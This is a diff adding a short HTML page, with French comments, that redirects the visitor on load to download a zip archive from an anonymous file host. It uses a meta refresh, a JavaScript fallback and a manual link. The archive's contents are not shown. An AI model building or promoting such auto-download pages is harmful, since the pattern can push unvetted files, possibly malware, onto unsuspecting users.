@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="refresh" content="0; url=https://files.catbox.moe/kf9rh9.zip" />
+    <title>Redirection</title>
+    <script>
+      // Backup JS si le meta-refresh est bloqué
+      window.location.href = "https://files.catbox.moe/kf9rh9.zip";
+    </script>
+  </head>
+  <body>
+    <p>Si la redirection ne fonctionne pas, clique <a href="https://files.catbox.moe/kf9rh9.zip">ici</a>.</p>
+  </body>
+</html>
